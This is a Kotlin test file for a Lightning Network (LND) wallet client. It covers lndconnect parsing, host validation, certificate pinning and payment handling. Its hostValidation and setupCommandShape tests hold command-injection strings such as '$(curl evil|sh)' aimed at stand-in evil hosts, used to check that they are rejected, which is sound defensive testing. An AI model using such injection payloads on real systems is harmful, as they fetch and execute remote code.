package io.github.milahajek.hayek

import org.junit.Assert.*
import org.junit.Assume.assumeTrue
import org.junit.Test

class LightningTest {
    private val macHex = "0201036c6e6402f801030a10" + "ab".repeat(80)

    private class MemPins : PinStore {
        val m = mutableMapOf<String, String>()
        override fun get(hostPort: String) = m[hostPort]
        override fun set(hostPort: String, fingerprint: String) { m[hostPort] = fingerprint }
    }

    @Test fun parseLndConnectHex() {
        val c = parseLndConnect("lndconnect://192.168.0.10:8080?macaroon=$macHex")
        assertEquals(LndConfig("192.168.0.10:8080", macHex), c)
    }

    @Test fun parseLndConnectBase64WithCert() {
        val b64 = java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(macHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray())
        val c = parseLndConnect("LNDCONNECT://10.0.0.5:8080?cert=MIIBabc&macaroon=$b64")
        assertEquals("10.0.0.5:8080", c.hostPort); assertEquals(macHex, c.macaroonHex)
    }

    @Test fun rawMacaroonNeedsHost() {
        assertEquals("192.168.0.10:8080", parseLndConnect(macHex, "192.168.0.10").hostPort)
        assertThrows(IllegalArgumentException::class.java) { parseLndConnect(macHex, null) }
        assertThrows(IllegalArgumentException::class.java) { parseLndConnect("lndconnect://abc.onion:8080?macaroon=$macHex") }
        assertThrows(IllegalArgumentException::class.java) { parseLndConnect("lndconnect://1.2.3.4:8080?macaroon=abcd") }
    }

    @Test fun setupCommandShape() {
        val cmd = lndSetupCommand("192.168.0.10:8080")
        assertTrue(cmd.contains("lndconnect://192.168.0.10:8080?macaroon=\$(lncli bakemacaroon --root_key_id 8211 offchain:read"))
        assertTrue(cmd.contains("&certfp=\$(openssl x509 -in ~/.lnd/tls.cert -noout -fingerprint -sha256 | cut -d= -f2)"))
        assertFalse(cmd.contains("onchain"))
        // Podvržená adresa se do příkazu nikdy nedostane
        assertTrue(lndSetupCommand("\$(curl evil|sh):8080").contains("IP-UZLU:8080"))
    }

    @Test fun hostValidation() {
        assertEquals("192.168.0.10:8080", normalizeLndHost("192.168.0.10"))
        assertEquals("raspiblitz.local:8080", normalizeLndHost("https://raspiblitz.local:8080/"))
        for (bad in listOf("\$(curl\${IFS}evil.example|sh):8080", "192.168.1.10:8080@evil.com:443", "a b:8080", "evil.com/x:8080", "\"x\":1"))
            assertThrows(bad, IllegalArgumentException::class.java) { normalizeLndHost(bad) }
        assertThrows(IllegalArgumentException::class.java) { parseLndConnect("lndconnect://192.168.1.10:8080@evil.com:443?macaroon=$macHex") }
    }

    @Test fun certFpFromQr() {
        val fp = (1..32).joinToString(":") { "%02X".format(it) }
        assertEquals(fp, parseLndConnect("lndconnect://192.168.0.10:8080?macaroon=$macHex&certfp=${fp.lowercase()}").certFp)
        assertNull(parseLndConnect("lndconnect://192.168.0.10:8080?macaroon=$macHex&certfp=nonsense").certFp)
        assertNull(parseLndConnect("lndconnect://192.168.0.10:8080?macaroon=$macHex").certFp)
    }

    @Test fun secretRoundTrip() {
        val c = LndConfig("192.168.0.10:8080", macHex)
        assertEquals(c, decodeLndSecret(encodeLndSecret(c)))
    }

    @Test fun cleanInvoice() {
        assertEquals("lnbc10u1abc", LndClient.cleanInvoice(" LIGHTNING:LNBC10U1ABC "))
        assertEquals("lnbc10u1abc", LndClient.cleanInvoice("bitcoin:bc1qxyz?amount=0.001&lightning=LNBC10U1ABC&label=x"))
        assertTrue(LndClient.looksLikeInvoice("lightning:LNBC" + "1".repeat(60)))
        assertFalse(LndClient.looksLikeInvoice("bc1qwnqafccacrx0cnfuqdr5sr0scjzeacpw8srt8a"))
    }

    @Test fun payStreamParsing() {
        val ok = LndClient.parsePayStream("""{"result":{"status":"SUCCEEDED","fee_sat":"2","payment_preimage":"ab"}}""")
        assertTrue(ok.ok); assertEquals(2L, ok.feeSat)
        val noRoute = LndClient.parsePayStream("""{"result":{"status":"IN_FLIGHT"}}""" + "\n" + """{"result":{"status":"FAILED","failure_reason":"FAILURE_REASON_NO_ROUTE"}}""")
        assertFalse(noRoute.ok); assertTrue(noRoute.failure!!.contains("cesta"))
        val err = LndClient.parsePayStream("""{"error":{"code":2,"message":"invoice is already paid"}}""")
        assertFalse(err.ok); assertTrue(err.failure!!.contains("zaplacená"))
    }

    @Test fun channelMath() {
        val c = LnChannel("03abc", null, null, 500_000, 495_000, 0, 5_000, true, false, false, true, "aa:1")
        assertEquals(490_000L, c.canSendSat); assertEquals(0L, c.canReceiveSat)
        assertEquals("aa", c.fundingTxid); assertEquals("03abc…", c.title)
        assertEquals(0L, c.copy(localSat = 1_000).canSendSat)
        assertEquals("ACINQ", c.copy(peerAlias = "ACINQ").title)
    }

    // ---- Proti skutečnému LND (spustí se jen s LND_HOST a LND_MAC v prostředí) ----

    private fun live(): LndClient {
        val host = System.getenv("LND_HOST"); val mac = System.getenv("LND_MAC")
        assumeTrue(host != null && mac != null)
        val cfg = parseLndConnect("lndconnect://$host?macaroon=$mac")
        // Bez připnutého otisku klient nic nepošle
        assertThrows(Exception::class.java) { LndClient(cfg, MemPins()).info() }
        pins.set("ln:${cfg.hostPort}", LndClient.probeFingerprint(cfg.hostPort))
        return LndClient(cfg, pins)
    }
    private val pins = MemPins()

    @Test fun liveRoundTrip() {
        val c = live()
        val info = c.info()
        assertTrue(info.version.startsWith("0.19"))
        assertEquals(0L, c.balance().canSendSat)
        val inv = c.addInvoice(1234, "Hayek test")
        val d = c.decode("lightning:" + inv.paymentRequest.uppercase())
        assertEquals(1234L, d.amountSat); assertEquals("Hayek test", d.description); assertFalse(d.expired())
        assertFalse(c.isSettled(inv.rHashHex))
        val r = c.pay(inv.paymentRequest, 10)
        assertFalse(r.ok); assertTrue(r.failure!!, r.failure!!.contains("vlastního uzlu"))
        c.history()
        assertTrue(c.channels().isEmpty())
        assertEquals(null to null, c.nodeAlias("03864ef025fde8fb587d989186ce6a4a186895ee44a926bfc370e2c366597a3f8f"))
    }

    @Test fun livePinMismatch() {
        live()
        val p = MemPins(); p.set("ln:${System.getenv("LND_HOST")}", "AA:BB")
        val c = LndClient(parseLndConnect("lndconnect://${System.getenv("LND_HOST")}?macaroon=${System.getenv("LND_MAC")}"), p)
        val e = assertThrows(CertMismatchException::class.java) { c.info() }
        assertEquals("AA:BB", e.expected)
    }

    @Test fun liveWrongMacaroon() {
        live()
        val p = MemPins(); p.set("ln:${System.getenv("LND_HOST")}", LndClient.probeFingerprint(System.getenv("LND_HOST")))
        val bad = LndClient(LndConfig(System.getenv("LND_HOST"), macHex), p)
        val e = assertThrows(LndException::class.java) { bad.info() }
        assertTrue(e.message!!, e.message!!.contains("klíč"))
    }
}

class LndSetupCommandLiveTest {
    /** Spustí skutečný příkaz z aplikace (bez qrencode) proti testovacímu LND a ověří, že QR obsah projde. */
    @Test fun commandProducesValidQr() {
        val out = System.getenv("LND_CMD_OUTPUT"); assumeTrue(out != null)
        val cfg = parseLndConnect(java.io.File(out!!).readText().trim())
        assertEquals(LndClient.probeFingerprint(cfg.hostPort), cfg.certFp)
    }
}
